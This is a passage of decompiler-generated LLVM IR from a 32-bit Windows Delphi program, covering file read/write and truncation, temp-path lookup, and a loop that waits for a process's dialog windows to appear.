  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1768
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1768
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1769
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1770
  br i1 %12, label %dec_label_pc_407023, label %dec_label_pc_406f0a, !insn.addr !1770

dec_label_pc_406f0a:                              ; preds = %dec_label_pc_406eee
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1771
  %14 = call i32 @function_40374c(), !insn.addr !1772
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1773
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1773
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1774
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1774
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1775
  %19 = call i32 @function_404700(), !insn.addr !1776
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_407023

dec_label_pc_407023:                              ; preds = %dec_label_pc_406f0a, %dec_label_pc_406eee, %dec_label_pc_406e84
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1777
  %21 = load i32, i32* %20, align 4, !insn.addr !1777
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1778
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1779
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1779
  store i32 4223045, i32* %23, align 4, !insn.addr !1779
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1780
  ret i32 %24, !insn.addr !1781
}

define i32 @function_40703e() local_unnamed_addr {
dec_label_pc_40703e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1782
  ret i32 %0, !insn.addr !1782
}

define i32 @function_407043() local_unnamed_addr {
dec_label_pc_407043:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1783
}

define i32 @function_407045(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407045:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1784
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1784
  %3 = load i32, i32* %2, align 4, !insn.addr !1784
  ret i32 %3, !insn.addr !1785
}

define i32 @function_40707c() local_unnamed_addr {
dec_label_pc_40707c:
  %esp.2.reg2mem = alloca i32, !insn.addr !1786
  %esp.1.reg2mem = alloca i32, !insn.addr !1786
  %esi.0.reg2mem = alloca i32, !insn.addr !1786
  %esp.0.reg2mem = alloca i32, !insn.addr !1786
  %ebx.0.reg2mem = alloca i32, !insn.addr !1786
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1787
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1788
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1788
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1788
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1789
  %2 = call i32 @function_403cb4(), !insn.addr !1790
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1791
  br i1 %3, label %dec_label_pc_407165, label %dec_label_pc_4070aa, !insn.addr !1791

dec_label_pc_4070aa:                              ; preds = %dec_label_pc_40707c
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1792
  %5 = call i32 @function_4036f4(), !insn.addr !1793
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1794
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1794
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1794
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1795
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1796
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1797
  br i1 %9, label %dec_label_pc_407165, label %dec_label_pc_4070e6, !insn.addr !1797

dec_label_pc_4070e6:                              ; preds = %dec_label_pc_4070aa
  %10 = call i32 @"@LStrClr"(), !insn.addr !1798
  %11 = call i32 @function_403cbc(), !insn.addr !1799
  %12 = icmp slt i32 %11, 0, !insn.addr !1800
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1801
  br i1 %12, label %dec_label_pc_407130, label %dec_label_pc_4070fe, !insn.addr !1801

dec_label_pc_4070fe:                              ; preds = %dec_label_pc_4070e6
  %13 = add i32 %11, 1, !insn.addr !1802
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1803
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1803
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1803
  br label %dec_label_pc_407101, !insn.addr !1803

dec_label_pc_407101:                              ; preds = %dec_label_pc_407101, %dec_label_pc_4070fe
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1804
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1804
  store i32 0, i32* %15, align 4, !insn.addr !1804
  %16 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1805
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1806
  %18 = add i32 %16, %17, !insn.addr !1806
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1806
  %20 = load i32, i32* %19, align 4, !insn.addr !1806
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1806
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1806
  store i32 %20, i32* %22, align 4, !insn.addr !1806
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1807
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1807
  store i32 ptrtoint (i32* @global_var_4071ac to i32), i32* %24, align 4, !insn.addr !1807
  %25 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1808
  %26 = or i32 %17, 4, !insn.addr !1809
  %27 = add i32 %25, %26, !insn.addr !1809
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1809
  %29 = load i32, i32* %28, align 4, !insn.addr !1809
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1809
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1809
  store i32 %29, i32* %31, align 4, !insn.addr !1809
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1810
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1810
  store i32 ptrtoint ([3 x i8]* @global_var_4071b8 to i32), i32* %33, align 4, !insn.addr !1810
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1811
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1812
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1813
  %37 = icmp eq i32 %36, 0, !insn.addr !1813
  %38 = icmp eq i1 %37, false, !insn.addr !1814
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1814
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1814
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1814
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1814
  br i1 %38, label %dec_label_pc_407101, label %dec_label_pc_407130, !insn.addr !1814

dec_label_pc_407130:                              ; preds = %dec_label_pc_407101, %dec_label_pc_4070e6
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1795
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_404700(), !insn.addr !1815
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1816
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1816
  store i32 0, i32* %42, align 4, !insn.addr !1816
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1817
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1817
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1817
  store i32 %45, i32* %44, align 4, !insn.addr !1817
  %46 = call i32 @function_4034f4(), !insn.addr !1818
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1819
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1819
  store i32 %46, i32* %48, align 4, !insn.addr !1819
  %49 = call i32 @function_40374c(), !insn.addr !1820
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1821
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1821
  store i32 %49, i32* %51, align 4, !insn.addr !1821
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1822
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1822
  store i32 %39, i32* %53, align 4, !insn.addr !1822
  %54 = call i32 @function_404498(), !insn.addr !1823
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1824
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1824
  store i32 %39, i32* %56, align 4, !insn.addr !1824
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1825
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1826
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1826
  store i32 %39, i32* %59, align 4, !insn.addr !1826
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1827
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1828
  br label %dec_label_pc_407165, !insn.addr !1828

dec_label_pc_407165:                              ; preds = %dec_label_pc_407130, %dec_label_pc_4070aa, %dec_label_pc_40707c
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1829
  %62 = load i32, i32* %61, align 4, !insn.addr !1829
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1830
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1831
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1831
  store i32 4223367, i32* %64, align 4, !insn.addr !1831
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1832
  ret i32 %65, !insn.addr !1833
}

define i32 @function_407180() local_unnamed_addr {
dec_label_pc_407180:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1834
  ret i32 %0, !insn.addr !1834
}

define i32 @function_407185() local_unnamed_addr {
dec_label_pc_407185:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1835
}

define i32 @function_407187(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407187:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1836
}

define i32 @function_4071bc() local_unnamed_addr {
dec_label_pc_4071bc:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036e4(), !insn.addr !1837
  %1 = call i32 @function_4036e4(), !insn.addr !1838
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1839
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1839
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1839
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1840
  %4 = call i32 @function_403cbc(), !insn.addr !1841
  %5 = icmp slt i32 %4, 0, !insn.addr !1842
  br i1 %5, label %dec_label_pc_407244, label %dec_label_pc_407212, !insn.addr !1843

dec_label_pc_407212:                              ; preds = %dec_label_pc_4071bc
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1844
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1845
  br label %dec_label_pc_407290

dec_label_pc_407244:                              ; preds = %dec_label_pc_4071bc
  %8 = call i32 @function_403cb4(), !insn.addr !1846
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1847
  %10 = call i32 @function_403cbc(), !insn.addr !1848
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1849
  %12 = call i32 @function_403cbc(), !insn.addr !1850
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1851
  %14 = call i32 @function_40707c(), !insn.addr !1852
  br label %dec_label_pc_407290, !insn.addr !1852

dec_label_pc_407290:                              ; preds = %dec_label_pc_407212, %dec_label_pc_407244
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1853
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1854
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1855
  ret i32 %16, !insn.addr !1856
}

define i32 @function_4072ab() local_unnamed_addr {
dec_label_pc_4072ab:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1857
  ret i32 %0, !insn.addr !1857
}

define i32 @function_4072b0() local_unnamed_addr {
dec_label_pc_4072b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1858
}

define i32 @function_4072b2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4072b2:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1859
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1859
  %3 = load i32, i32* %2, align 4, !insn.addr !1859
  ret i32 %3, !insn.addr !1860
}

define i32 @function_4072bc() local_unnamed_addr {
dec_label_pc_4072bc:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1861
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1861
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1861
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1862
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1863
  %3 = add i32 %2, 1, !insn.addr !1863
  %4 = icmp eq i32 %3, 0, !insn.addr !1863
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1863
  %5 = icmp eq i1 %4, false, !insn.addr !1864
  br i1 %5, label %dec_label_pc_4072f4, label %dec_label_pc_4072d5, !insn.addr !1864

dec_label_pc_4072d5:                              ; preds = %dec_label_pc_4072bc
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1865
  %7 = icmp eq i32 %6, 0, !insn.addr !1865
  br i1 %7, label %dec_label_pc_4072e4, label %dec_label_pc_4072df, !insn.addr !1866

dec_label_pc_4072df:                              ; preds = %dec_label_pc_4072d5
  %8 = call i32 @function_40707c(), !insn.addr !1867
  br label %dec_label_pc_4072e4, !insn.addr !1867

dec_label_pc_4072e4:                              ; preds = %dec_label_pc_4072df, %dec_label_pc_4072d5
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1868
  br label %dec_label_pc_4072f4, !insn.addr !1868

dec_label_pc_4072f4:                              ; preds = %dec_label_pc_4072e4, %dec_label_pc_4072bc
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1869
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1870
  ret i32 0, !insn.addr !1871
}

define i32 @function_407302() local_unnamed_addr {
dec_label_pc_407302:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1872
  ret i32 %0, !insn.addr !1872
}

define i32 @function_407307() local_unnamed_addr {
dec_label_pc_407307:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1873
}

define i32 @function_407309(i32 %arg1) local_unnamed_addr {
dec_label_pc_407309:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1874
}

define i32 @function_40730c() local_unnamed_addr {
dec_label_pc_40730c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1875
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1875
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1875
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1876
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1877
  %3 = add i32 %2, -1, !insn.addr !1877
  %4 = icmp eq i32 %2, 0, !insn.addr !1877
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1877
  %5 = icmp eq i1 %4, false, !insn.addr !1878
  br i1 %5, label %dec_label_pc_407340, label %dec_label_pc_407326, !insn.addr !1878

dec_label_pc_407326:                              ; preds = %dec_label_pc_40730c
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1879
  br label %dec_label_pc_407340, !insn.addr !1880

dec_label_pc_407340:                              ; preds = %dec_label_pc_407326, %dec_label_pc_40730c
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1881
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1882
  ret i32 0, !insn.addr !1883
}

define i32 @function_40734e() local_unnamed_addr {
dec_label_pc_40734e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1884
  ret i32 %0, !insn.addr !1884
}

define i32 @function_407353() local_unnamed_addr {
dec_label_pc_407353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1885
}

define i32 @function_407355(i32 %arg1) local_unnamed_addr {
dec_label_pc_407355:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1886
}

define i1 @function_407358(i8* %pszPath) local_unnamed_addr {
dec_label_pc_407358:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1887
  ret i1 %0, !insn.addr !1887
}

define i32 @function_407360() local_unnamed_addr {
dec_label_pc_407360:
  %eax.0.reg2mem = alloca i32, !insn.addr !1888
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1889
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1890
  %2 = icmp eq i32 %1, 0, !insn.addr !1891
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1892
  br i1 %2, label %dec_label_pc_407396, label %dec_label_pc_407378, !insn.addr !1892

dec_label_pc_407378:                              ; preds = %dec_label_pc_407360
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1889
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1893
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1893
  %7 = load i8, i8* %6, align 1, !insn.addr !1893
  %8 = icmp eq i8 %7, 92, !insn.addr !1893
  br i1 %8, label %dec_label_pc_407388, label %dec_label_pc_40737f, !insn.addr !1894

dec_label_pc_40737f:                              ; preds = %dec_label_pc_407378
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1895
  store i8 92, i8* %9, align 1, !insn.addr !1895
  %10 = or i32 %3, 1, !insn.addr !1896
  %11 = add i32 %1, %10, !insn.addr !1896
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1896
  store i8 0, i8* %12, align 1, !insn.addr !1896
  br label %dec_label_pc_407388, !insn.addr !1896

dec_label_pc_407388:                              ; preds = %dec_label_pc_40737f, %dec_label_pc_407378
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1897
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1897
  br label %dec_label_pc_407396, !insn.addr !1897

dec_label_pc_407396:                              ; preds = %dec_label_pc_407388, %dec_label_pc_407360
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1898
}

define i32 @function_4073a0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4073a0:
  %esp.0.reg2mem = alloca i32, !insn.addr !1899
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1900
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1901
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1901
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1901
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1902
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1903
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1903
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1904
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1904
  %5 = icmp eq i1 %4, false, !insn.addr !1905
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1906
  br i1 %5, label %dec_label_pc_407457, label %dec_label_pc_4073d7, !insn.addr !1906

dec_label_pc_4073d7:                              ; preds = %dec_label_pc_4073a0
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1907
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1907
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1908
  %8 = icmp eq i32 %7, 32770, !insn.addr !1909
  %9 = icmp eq i1 %8, false, !insn.addr !1910
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1910
  br i1 %9, label %dec_label_pc_407457, label %dec_label_pc_4073e6, !insn.addr !1910

dec_label_pc_4073e6:                              ; preds = %dec_label_pc_4073d7
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1911
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1911
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1912
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1912
  %13 = add i32 %arg1, 4, !insn.addr !1913
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1913
  %15 = load i32, i32* %14, align 4, !insn.addr !1913
  %16 = icmp eq i32 %15, %12, !insn.addr !1913
  %17 = icmp eq i1 %16, false, !insn.addr !1914
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1914
  br i1 %17, label %dec_label_pc_407457, label %dec_label_pc_4073f1, !insn.addr !1914

dec_label_pc_4073f1:                              ; preds = %dec_label_pc_4073e6
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1915
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1915
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1916
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1917
  %21 = load i32, i32* %20, align 4, !insn.addr !1917
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1918
  %23 = icmp eq i32 %21, %22, !insn.addr !1918
  %24 = icmp eq i1 %23, false, !insn.addr !1919
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1919
  br i1 %24, label %dec_label_pc_407457, label %dec_label_pc_407402, !insn.addr !1919

dec_label_pc_407402:                              ; preds = %dec_label_pc_4073f1
  %25 = add i32 %arg1, 8, !insn.addr !1920
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1920
  %27 = load i32, i32* %26, align 4, !insn.addr !1920
  %28 = icmp eq i32 %27, 0, !insn.addr !1920
  br i1 %28, label %dec_label_pc_40742c, label %dec_label_pc_407408, !insn.addr !1921

dec_label_pc_407408:                              ; preds = %dec_label_pc_407402
  %29 = call i32 @function_407578(), !insn.addr !1922
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1923
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1924
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_407457

dec_label_pc_40742c:                              ; preds = %dec_label_pc_407402
  %32 = add i32 %arg1, 12, !insn.addr !1925
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1925
  %34 = load i32, i32* %33, align 4, !insn.addr !1925
  %35 = add i32 %arg1, 16, !insn.addr !1926
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1926
  %37 = load i32, i32* %36, align 4, !insn.addr !1926
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1927
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1927
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1927
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1927
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1927
  %43 = add i32 %arg1, 24, !insn.addr !1928
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1928
  store i32 %42, i32* %44, align 4, !insn.addr !1928
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1929
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1929
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1930
  %47 = icmp eq i1 %46, false, !insn.addr !1931
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1932
  br i1 %47, label %dec_label_pc_407457, label %dec_label_pc_407452, !insn.addr !1932

dec_label_pc_407452:                              ; preds = %dec_label_pc_40742c
  %48 = add i32 %arg1, 20, !insn.addr !1933
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1933
  store i32 %arg2, i32* %49, align 4, !insn.addr !1933
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1934
  br label %dec_label_pc_407457, !insn.addr !1934

dec_label_pc_407457:                              ; preds = %dec_label_pc_407408, %dec_label_pc_407452, %dec_label_pc_40742c, %dec_label_pc_4073f1, %dec_label_pc_4073e6, %dec_label_pc_4073d7, %dec_label_pc_4073a0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1935
  %51 = load i32, i32* %50, align 4, !insn.addr !1935
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1936
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1937
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1937
  store i32 4224121, i32* %53, align 4, !insn.addr !1937
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1938
  ret i32 %54, !insn.addr !1939
}

define i32 @function_407472() local_unnamed_addr {
dec_label_pc_407472:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1940
  ret i32 %0, !insn.addr !1940
}

define i32 @function_407477() local_unnamed_addr {
dec_label_pc_407477:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1941
}

define i32 @function_407479(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407479:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1942
}

define i32 @function_407484(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407484:
  %esp.0.reg2mem = alloca i32, !insn.addr !1943
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1944
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1945
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1945
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1945
  %6 = call i32 @function_404448(), !insn.addr !1946
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1947
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1948
  br label %dec_label_pc_4074c8, !insn.addr !1948

dec_label_pc_4074c8:                              ; preds = %dec_label_pc_4074e7, %dec_label_pc_407484
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1947
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1947
  store i32 %7, i32* %9, align 4, !insn.addr !1947
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1949
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1949
  store i32 4223904, i32* %11, align 4, !insn.addr !1949
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1950
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1951
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1951
  store i32 1, i32* %14, align 4, !insn.addr !1951
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1952
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1953
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1953
  store i32 0, i32* %16, align 4, !insn.addr !1953
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1954
  %18 = icmp eq i1 %17, false, !insn.addr !1955
  %19 = icmp eq i1 %18, false, !insn.addr !1956
  br i1 %19, label %dec_label_pc_4074f2, label %dec_label_pc_4074e7, !insn.addr !1956

dec_label_pc_4074e7:                              ; preds = %dec_label_pc_4074c8
  %20 = call i32 @function_404448(), !insn.addr !1957
  %21 = sub i32 %20, %6, !insn.addr !1958
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1959
  %23 = icmp eq i1 %22, false, !insn.addr !1960
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1960
  br i1 %23, label %dec_label_pc_4074c8, label %dec_label_pc_4074f2, !insn.addr !1960

dec_label_pc_4074f2:                              ; preds = %dec_label_pc_4074e7, %dec_label_pc_4074c8
  ret i32 0, !insn.addr !1961
}

define i32 @function_40750c() local_unnamed_addr {
dec_label_pc_40750c:
  %0 = call i32 @__decompiler_undefined_function_0()
